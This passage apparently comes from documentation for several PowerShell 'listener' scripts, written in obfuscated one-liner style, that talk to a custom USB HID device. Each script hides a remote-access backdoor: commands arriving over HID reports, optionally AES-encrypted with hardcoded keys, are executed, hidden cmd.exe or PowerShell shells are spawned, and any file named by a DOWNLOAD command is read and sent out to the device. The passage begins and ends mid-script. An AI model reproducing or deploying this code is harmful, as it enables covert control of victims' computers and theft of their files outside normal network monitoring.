function CS($D){$sb=[byte[]]::new($D.F);$sb[0]=$RI;try{if([H]::HidD_GetFeature($D.H,$sb,$sb.Length)){if($sb[1]-eq$MG-and$sb[2]-eq0xFF){return $true}}}catch{};return $false}
function F($D,$P){$P=[Environment]::ExpandEnvironmentVariables($P);if(!(Test-Path $P)){SE $D "Not found";return}if((Get-Item $P).PSIsContainer){SE $D "Is directory";return}try{$fb=[IO.File]::ReadAllBytes($P)}catch{SE $D "Read error";return}if($fb.Length-gt10MB){SE $D "Too large";return}$fn=[IO.Path]::GetFileName($P);$fs=$fb.Length;$nb=[Text.Encoding]::UTF8.GetBytes($fn);$nl=[Math]::Min($nb.Length,255);$sf=[byte[]]::new(7+$nl);$sf[0]=$MG;$sf[1]=0xAA;$sf[2]=$fs-band 0xFF;$sf[3]=($fs-shr 8)-band 0xFF;$sf[4]=($fs-shr 16)-band 0xFF;$sf[5]=($fs-shr 24)-band 0xFF;$sf[6]=$nl;[Array]::Copy($nb,0,$sf,7,$nl);SR $D $sf;Sleep -M $MD;$cn=0;for($i=0;$i-lt$fs;$i+=$BC){if(($cn%50-eq0)-and(CS $D)){W $D "STOPPED";return};$cn++;$cs=[Math]::Min($BC,$fs-$i);$df=[byte[]]::new(4+$cs);$df[0]=$MG;$df[1]=0xBB;$df[2]=$cs-band 0xFF;$df[3]=($cs-shr 8)-band 0xFF;[Array]::Copy($fb,$i,$df,4,$cs);SR $D $df;if($cn%4-eq0){Sleep -M $BD}};Sleep -M $MD;SR $D ([byte[]]@($MG,0xCC))}
function Y($z){$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$k=[byte[]]::new(16);$v=[byte[]]::new(16);for($i=0;$i-lt16;$i++){$k[$i]=[Convert]::ToByte($KY.Substring($i*2,2),16);$v[$i]=[Convert]::ToByte($IV.Substring($i*2,2),16)};$a.Key=$k;$a.IV=$v;(New-Object IO.StreamReader([Security.Cryptography.CryptoStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($z)),$a.CreateDecryptor(),'Read'))).ReadToEnd()}
function DR($ms){if(!$script:SH-or$script:SH.HasExited){return""};$sb=New-Object Text.StringBuilder;$e=[Console]::OutputEncoding;$dl=[DateTime]::Now.AddMilliseconds($ms);while([DateTime]::Now-lt$dl-and!$script:SH.HasExited){if(!$script:OT){$script:OT=$script:SH.StandardOutput.BaseStream.ReadAsync($script:OB,0,$BZ)};if($script:OT.IsCompleted){if($script:OT.Result-gt0){[void]$sb.Append($e.GetString($script:OB,0,$script:OT.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:OT=$null};if(!$script:ET){$script:ET=$script:SH.StandardError.BaseStream.ReadAsync($script:EB,0,$BZ)};if($script:ET.IsCompleted){if($script:ET.Result-gt0){[void]$sb.Append($e.GetString($script:EB,0,$script:ET.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:ET=$null};Sleep -M 10};$sb.ToString().TrimEnd()}
function SS($e){try{$script:SH=New-Object Diagnostics.Process;$script:SH.StartInfo.FileName=$e;$script:SH.StartInfo.UseShellExecute=$false;$script:SH.StartInfo.RedirectStandardInput=$true;$script:SH.StartInfo.RedirectStandardOutput=$true;$script:SH.StartInfo.RedirectStandardError=$true;$script:SH.StartInfo.CreateNoWindow=$true;if($script:SH.Start()){$script:OT=$null;$script:ET=$null;return $true}}catch{};$script:SH=$null;$false}
function KS{if($script:SH){try{if(!$script:SH.HasExited){$script:SH.Kill()};$script:SH.Dispose()}catch{};$script:SH=$null;$script:OT=$null;$script:ET=$null}}
function TX($c){if($script:SH-and!$script:SH.HasExited){try{$script:SH.StandardInput.WriteLine($c)}catch{KS;return""};DR 1500}else{""}}
function CN{while(1){$d=G;if($d){Write-Host "Connected";return $d};Write-Host "Waiting...";Sleep -S $RC}}
$d=CN;W $d "Ready";$bf="";$rx=0
while(1){$b=[byte[]]::new($d.I);$r=0;$ok=$false;try{$ok=[H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0}catch{};if(-not$ok){Write-Host "Reconnecting...";try{$d.H.Close()}catch{};$d=CN;W $d "Ready";$bf="";$rx=0;continue};$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0);if($s){if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}if($s-match'<<END>>'){$s=$s-replace'<<END>>';$bf+=$s;$rx=0;$t=$bf.Trim();if($t){$c=if($EN){try{Y $t}catch{W $d "ERR";$bf="";continue}}else{$t};if($c){$c=$c.Trim();if($c-match'^DOWNLOAD\s+(.+)$'){F $d $Matches[1].Trim()}elseif(($c-ieq"cmd"-or$c-ieq"cmd.exe")-and!$script:SH){if(SS "cmd.exe"){$o=DR 800;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif(($c-ieq"powershell"-or$c-ieq"powershell.exe")-and!$script:SH){if(SS "powershell.exe"){$o=DR 1500;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif($c-ieq"exit"-and$script:SH){KS;W $d "OK"}elseif($script:SH){if($script:SH.HasExited){KS;try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}else{$o=TX $c;W $d $(if($o){$o}else{"OK"})}}else{try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}}$bf=""}}elseif($rx){$bf+=$s}}}
```

---

### Advanced Feature Report Listener with Flow Control (`advanced_feature_report_flowcontrol.ps1`)

Feature Report listener with auto-reconnect, VID/PID fallback, and full adaptive flow control support.

```powershell
# Config
$VI=0x303a;$PI=0x0002;$UP=0xFF00;$UG=0x01;$IL=64;$OL=64;$FL=64;$RI=6;$BC=512;$RD=1500;$BD=10;$MD=30;$BZ=16384;$MG=0xD1;$KY="172C6371FEDFD66DC2F9B89F01779D55";$IV="A4D4BA68394CB046DB232032430E58F4";$EN=$false;$MR=20;$RC=3;$script:SH=$null;$script:OT=$null;$script:ET=$null;$script:OB=[byte[]]::new($BZ);$script:EB=[byte[]]::new($BZ)
# Flow control delays (ms) - adjust these to tune transfer speed
$SD=100   # SLOW delay (when WS queue > 5)
$SSD=200  # SLOWER delay (when WS queue > 8)
Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;using System.Diagnostics;public class H{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool WriteFile(SafeFileHandle h,byte[]b,uint n,out uint w,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_SetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_GetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}public static void U(int us){long t=Stopwatch.GetTimestamp()+us*(Stopwatch.Frequency/1000000);while(Stopwatch.GetTimestamp()<t);}}'
function G{$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g);$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18);if(!$s){return}$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di);$fb=$null;while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){$r=0;[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x;$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}));if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){$h=[H]::CreateFile([Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4)),-1073741824,3,0,3,0,0);if(!$h.IsInvalid){$a=New-Object H+A;$a.s=[H]::Z($a);if([H]::HidD_GetAttributes($h,[ref]$a)){$p=0;if([H]::HidD_GetPreparsedData($h,[ref]$p)){$c=New-Object H+C;[H]::HidP_GetCaps($p,[ref]$c)>$x;[H]::HidD_FreePreparsedData($p)>$x;if($c.up-eq$UP){if($a.v-eq$VI-and$a.p-eq$PI){[Runtime.InteropServices.Marshal]::FreeHGlobal($b);[H]::SetupDiDestroyDeviceInfoList($s)>$x;return @{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1}}elseif(!$fb-and$c.u-eq$UG-and$c.il-eq$IL-and$c.ol-eq$OL-and$c.fl-eq$FL){$fb=@{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1};continue}}}}$h.Close()}}[Runtime.InteropServices.Marshal]::FreeHGlobal($b)};[H]::SetupDiDestroyDeviceInfoList($s)>$x;return $fb}
function SR($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=$D.P){$z=[Math]::Min($D.P,$A.Length-$i);$p=[byte[]]::new($D.F);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetFeature($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RD)}}
function W($D,$T){SR $D ([Text.Encoding]::ASCII.GetBytes("$T`n"))}
function SE($D,$M){$b=[Text.Encoding]::UTF8.GetBytes($M);$l=[Math]::Min($b.Length,255);$f=[byte[]]::new(3+$l);$f[0]=$MG;$f[1]=0xEE;$f[2]=$l;[Array]::Copy($b,0,$f,3,$l);SR $D $f}
# Flow control check - returns: STOP, SLOWER, SLOW, or NORMAL
function CS($D){$sb=[byte[]]::new($D.F);$sb[0]=$RI;try{if([H]::HidD_GetFeature($D.H,$sb,$sb.Length)){if($sb[1]-eq$MG){switch($sb[2]){0xFF{return 'STOP'}0xFC{return 'SLOWER'}0xFE{return 'SLOW'}0xFD{return 'NORMAL'}}}}}catch{};return 'NORMAL'}
# File transfer with flow control
function F($D,$P){$P=[Environment]::ExpandEnvironmentVariables($P);if(!(Test-Path $P)){SE $D "Not found";return}if((Get-Item $P).PSIsContainer){SE $D "Is directory";return}try{$fb=[IO.File]::ReadAllBytes($P)}catch{SE $D "Read error";return}if($fb.Length-gt10MB){SE $D "Too large";return}$fn=[IO.Path]::GetFileName($P);$fs=$fb.Length;$nb=[Text.Encoding]::UTF8.GetBytes($fn);$nl=[Math]::Min($nb.Length,255);$sf=[byte[]]::new(7+$nl);$sf[0]=$MG;$sf[1]=0xAA;$sf[2]=$fs-band 0xFF;$sf[3]=($fs-shr 8)-band 0xFF;$sf[4]=($fs-shr 16)-band 0xFF;$sf[5]=($fs-shr 24)-band 0xFF;$sf[6]=$nl;[Array]::Copy($nb,0,$sf,7,$nl);SR $D $sf;Sleep -M $MD;$cn=0;for($i=0;$i-lt$fs;$i+=$BC){$sg=CS $D;if($sg-eq'STOP'){W $D "STOPPED";return};if($sg-eq'SLOWER'){Sleep -M $SSD}elseif($sg-eq'SLOW'){Sleep -M $SD};$cn++;$cs=[Math]::Min($BC,$fs-$i);$df=[byte[]]::new(4+$cs);$df[0]=$MG;$df[1]=0xBB;$df[2]=$cs-band 0xFF;$df[3]=($cs-shr 8)-band 0xFF;[Array]::Copy($fb,$i,$df,4,$cs);SR $D $df;if($cn%4-eq0){Sleep -M $BD}};Sleep -M $MD;SR $D ([byte[]]@($MG,0xCC))}
function Y($z){$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$k=[byte[]]::new(16);$v=[byte[]]::new(16);for($i=0;$i-lt16;$i++){$k[$i]=[Convert]::ToByte($KY.Substring($i*2,2),16);$v[$i]=[Convert]::ToByte($IV.Substring($i*2,2),16)};$a.Key=$k;$a.IV=$v;(New-Object IO.StreamReader([Security.Cryptography.CryptoStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($z)),$a.CreateDecryptor(),'Read'))).ReadToEnd()}
function DR($ms){if(!$script:SH-or$script:SH.HasExited){return""};$sb=New-Object Text.StringBuilder;$e=[Console]::OutputEncoding;$dl=[DateTime]::Now.AddMilliseconds($ms);while([DateTime]::Now-lt$dl-and!$script:SH.HasExited){if(!$script:OT){$script:OT=$script:SH.StandardOutput.BaseStream.ReadAsync($script:OB,0,$BZ)};if($script:OT.IsCompleted){if($script:OT.Result-gt0){[void]$sb.Append($e.GetString($script:OB,0,$script:OT.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:OT=$null};if(!$script:ET){$script:ET=$script:SH.StandardError.BaseStream.ReadAsync($script:EB,0,$BZ)};if($script:ET.IsCompleted){if($script:ET.Result-gt0){[void]$sb.Append($e.GetString($script:EB,0,$script:ET.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:ET=$null};Sleep -M 10};$sb.ToString().TrimEnd()}
function SS($e){try{$script:SH=New-Object Diagnostics.Process;$script:SH.StartInfo.FileName=$e;$script:SH.StartInfo.UseShellExecute=$false;$script:SH.StartInfo.RedirectStandardInput=$true;$script:SH.StartInfo.RedirectStandardOutput=$true;$script:SH.StartInfo.RedirectStandardError=$true;$script:SH.StartInfo.CreateNoWindow=$true;if($script:SH.Start()){$script:OT=$null;$script:ET=$null;return $true}}catch{};$script:SH=$null;$false}
function KS{if($script:SH){try{if(!$script:SH.HasExited){$script:SH.Kill()};$script:SH.Dispose()}catch{};$script:SH=$null;$script:OT=$null;$script:ET=$null}}
function TX($c){if($script:SH-and!$script:SH.HasExited){try{$script:SH.StandardInput.WriteLine($c)}catch{KS;return""};DR 1500}else{""}}
function CN{while(1){$d=G;if($d){Write-Host "Connected";return $d};Write-Host "Waiting...";Sleep -S $RC}}
$d=CN;W $d "Ready";$bf="";$rx=0
while(1){$b=[byte[]]::new($d.I);$r=0;$ok=$false;try{$ok=[H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0}catch{};if(-not$ok){Write-Host "Reconnecting...";try{$d.H.Close()}catch{};$d=CN;W $d "Ready";$bf="";$rx=0;continue};$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0);if($s){if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}if($s-match'<<END>>'){$s=$s-replace'<<END>>';$bf+=$s;$rx=0;$t=$bf.Trim();if($t){$c=if($EN){try{Y $t}catch{W $d "ERR";$bf="";continue}}else{$t};if($c){$c=$c.Trim();if($c-match'^DOWNLOAD\s+(.+)$'){F $d $Matches[1].Trim()}elseif(($c-ieq"cmd"-or$c-ieq"cmd.exe")-and!$script:SH){if(SS "cmd.exe"){$o=DR 800;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif(($c-ieq"powershell"-or$c-ieq"powershell.exe")-and!$script:SH){if(SS "powershell.exe"){$o=DR 1500;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif($c-ieq"exit"-and$script:SH){KS;W $d "OK"}elseif($script:SH){if($script:SH.HasExited){KS;try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}else{$o=TX $c;W $d $(if($o){$o}else{"OK"})}}else{try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}}$bf=""}}elseif($rx){$bf+=$s}}}
```

---

### Advanced Output Report Listener (`advanced_output_report.ps1`)

Output Report listener with auto-reconnect and VID/PID fallback. Higher throughput for file transfers.

```powershell
$VI=0x303a;$PI=0x0002;$UP=0xFF00;$UG=0x01;$IL=64;$OL=64;$FL=64;$RI=6;$BC=512;$RD=1500;$BD=10;$MD=30;$BZ=16384;$MG=0xD1;$KY="172C6371FEDFD66DC2F9B89F01779D55";$IV="A4D4BA68394CB046DB232032430E58F4";$EN=$true;$RU=1000;$MR=20;$RC=3;$script:SH=$null;$script:OT=$null;$script:ET=$null;$script:OB=[byte[]]::new($BZ);$script:EB=[byte[]]::new($BZ)
Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;using System.Diagnostics;public class H{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool WriteFile(SafeFileHandle h,byte[]b,uint n,out uint w,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_SetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_GetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_SetOutputReport(SafeFileHandle h,byte[]b,uint l);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}public static void U(int us){long t=Stopwatch.GetTimestamp()+us*(Stopwatch.Frequency/1000000);while(Stopwatch.GetTimestamp()<t);}}'
function G{$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g);$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18);if(!$s){return}$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di);$fb=$null;while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){$r=0;[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x;$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}));if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){$h=[H]::CreateFile([Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4)),-1073741824,3,0,3,0,0);if(!$h.IsInvalid){$a=New-Object H+A;$a.s=[H]::Z($a);if([H]::HidD_GetAttributes($h,[ref]$a)){$p=0;if([H]::HidD_GetPreparsedData($h,[ref]$p)){$c=New-Object H+C;[H]::HidP_GetCaps($p,[ref]$c)>$x;[H]::HidD_FreePreparsedData($p)>$x;if($c.up-eq$UP){if($a.v-eq$VI-and$a.p-eq$PI){[Runtime.InteropServices.Marshal]::FreeHGlobal($b);[H]::SetupDiDestroyDeviceInfoList($s)>$x;return @{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1}}elseif(!$fb-and$c.u-eq$UG-and$c.il-eq$IL-and$c.ol-eq$OL-and$c.fl-eq$FL){$fb=@{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1};continue}}}}$h.Close()}}[Runtime.InteropServices.Marshal]::FreeHGlobal($b)};[H]::SetupDiDestroyDeviceInfoList($s)>$x;return $fb}
function SR($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=$D.P){$z=[Math]::Min($D.P,$A.Length-$i);$p=[byte[]]::new($D.F);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetFeature($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RD)}}
function SO($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=($D.O-1)){$z=[Math]::Min($D.O-1,$A.Length-$i);$p=[byte[]]::new($D.O);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetOutputReport($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RU)}}
function W($D,$T){SR $D ([Text.Encoding]::ASCII.GetBytes("$T`n"))}
function SE($D,$M){$b=[Text.Encoding]::UTF8.GetBytes($M);$l=[Math]::Min($b.Length,255);$f=[byte[]]::new(3+$l);$f[0]=$MG;$f[1]=0xEE;$f[2]=$l;[Array]::Copy($b,0,$f,3,$l);SR $D $f}
function CS($D){$sb=[byte[]]::new($D.F);$sb[0]=$RI;try{if([H]::HidD_GetFeature($D.H,$sb,$sb.Length)){if($sb[1]-eq$MG-and$sb[2]-eq0xFF){return $true}}}catch{};return $false}
function F($D,$P){$P=[Environment]::ExpandEnvironmentVariables($P);if(!(Test-Path $P)){SE $D "Not found";return}if((Get-Item $P).PSIsContainer){SE $D "Is directory";return}try{$fb=[IO.File]::ReadAllBytes($P)}catch{SE $D "Read error";return}if($fb.Length-gt10MB){SE $D "Too large";return}$fn=[IO.Path]::GetFileName($P);$fs=$fb.Length;$nb=[Text.Encoding]::UTF8.GetBytes($fn);$nl=[Math]::Min($nb.Length,255);$sf=[byte[]]::new(7+$nl);$sf[0]=$MG;$sf[1]=0xAA;$sf[2]=$fs-band 0xFF;$sf[3]=($fs-shr 8)-band 0xFF;$sf[4]=($fs-shr 16)-band 0xFF;$sf[5]=($fs-shr 24)-band 0xFF;$sf[6]=$nl;[Array]::Copy($nb,0,$sf,7,$nl);SO $D $sf;Sleep -M $MD;$cn=0;for($i=0;$i-lt$fs;$i+=$BC){if(($cn%50-eq0)-and(CS $D)){W $D "STOPPED";return};$cn++;$cs=[Math]::Min($BC,$fs-$i);$df=[byte[]]::new(4+$cs);$df[0]=$MG;$df[1]=0xBB;$df[2]=$cs-band 0xFF;$df[3]=($cs-shr 8)-band 0xFF;[Array]::Copy($fb,$i,$df,4,$cs);SO $D $df;if($cn%4-eq0){Sleep -M $BD}};Sleep -M $MD;SO $D ([byte[]]@($MG,0xCC))}
function Y($z){$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$k=[byte[]]::new(16);$v=[byte[]]::new(16);for($i=0;$i-lt16;$i++){$k[$i]=[Convert]::ToByte($KY.Substring($i*2,2),16);$v[$i]=[Convert]::ToByte($IV.Substring($i*2,2),16)};$a.Key=$k;$a.IV=$v;(New-Object IO.StreamReader([Security.Cryptography.CryptoStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($z)),$a.CreateDecryptor(),'Read'))).ReadToEnd()}
function DR($ms){if(!$script:SH-or$script:SH.HasExited){return""};$sb=New-Object Text.StringBuilder;$e=[Console]::OutputEncoding;$dl=[DateTime]::Now.AddMilliseconds($ms);while([DateTime]::Now-lt$dl-and!$script:SH.HasExited){if(!$script:OT){$script:OT=$script:SH.StandardOutput.BaseStream.ReadAsync($script:OB,0,$BZ)};if($script:OT.IsCompleted){if($script:OT.Result-gt0){[void]$sb.Append($e.GetString($script:OB,0,$script:OT.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:OT=$null};if(!$script:ET){$script:ET=$script:SH.StandardError.BaseStream.ReadAsync($script:EB,0,$BZ)};if($script:ET.IsCompleted){if($script:ET.Result-gt0){[void]$sb.Append($e.GetString($script:EB,0,$script:ET.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:ET=$null};Sleep -M 10};$sb.ToString().TrimEnd()}
function SS($e){try{$script:SH=New-Object Diagnostics.Process;$script:SH.StartInfo.FileName=$e;$script:SH.StartInfo.UseShellExecute=$false;$script:SH.StartInfo.RedirectStandardInput=$true;$script:SH.StartInfo.RedirectStandardOutput=$true;$script:SH.StartInfo.RedirectStandardError=$true;$script:SH.StartInfo.CreateNoWindow=$true;if($script:SH.Start()){$script:OT=$null;$script:ET=$null;return $true}}catch{};$script:SH=$null;$false}
function KS{if($script:SH){try{if(!$script:SH.HasExited){$script:SH.Kill()};$script:SH.Dispose()}catch{};$script:SH=$null;$script:OT=$null;$script:ET=$null}}
function TX($c){if($script:SH-and!$script:SH.HasExited){try{$script:SH.StandardInput.WriteLine($c)}catch{KS;return""};DR 1500}else{""}}
function CN{while(1){$d=G;if($d){Write-Host "Connected";return $d};Write-Host "Waiting...";Sleep -S $RC}}
$d=CN;W $d "Ready";$bf="";$rx=0
while(1){$b=[byte[]]::new($d.I);$r=0;$ok=$false;try{$ok=[H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0}catch{};if(-not$ok){Write-Host "Reconnecting...";try{$d.H.Close()}catch{};$d=CN;W $d "Ready";$bf="";$rx=0;continue};$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0);if($s){if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}if($s-match'<<END>>'){$s=$s-replace'<<END>>';$bf+=$s;$rx=0;$t=$bf.Trim();if($t){$c=if($EN){try{Y $t}catch{W $d "ERR";$bf="";continue}}else{$t};if($c){$c=$c.Trim();if($c-match'^DOWNLOAD\s+(.+)$'){F $d $Matches[1].Trim()}elseif(($c-ieq"cmd"-or$c-ieq"cmd.exe")-and!$script:SH){if(SS "cmd.exe"){$o=DR 800;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif(($c-ieq"powershell"-or$c-ieq"powershell.exe")-and!$script:SH){if(SS "powershell.exe"){$o=DR 1500;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif($c-ieq"exit"-and$script:SH){KS;W $d "OK"}elseif($script:SH){if($script:SH.HasExited){KS;try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}else{$o=TX $c;W $d $(if($o){$o}else{"OK"})}}else{try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}}$bf=""}}elseif($rx){$bf+=$s}}}
```

---

### Advanced Output Report Listener with Flow Control (`advanced_output_report_flowcontrol.ps1`)

Output Report listener with auto-reconnect, VID/PID fallback, and full adaptive flow control. Best for large file transfers with maximum stability.

```powershell
# Config
$VI=0x303a;$PI=0x0002;$UP=0xFF00;$UG=0x01;$IL=64;$OL=64;$FL=64;$RI=6;$BC=512;$RD=1500;$BD=10;$MD=30;$BZ=16384;$MG=0xD1;$KY="172C6371FEDFD66DC2F9B89F01779D55";$IV="A4D4BA68394CB046DB232032430E58F4";$EN=$false;$RU=1000;$MR=20;$RC=3;$script:SH=$null;$script:OT=$null;$script:ET=$null;$script:OB=[byte[]]::new($BZ);$script:EB=[byte[]]::new($BZ)
# Flow control delays (ms) - adjust these to tune transfer speed
$SD=100   # SLOW delay (when WS queue > 5)
$SSD=200  # SLOWER delay (when WS queue > 8)
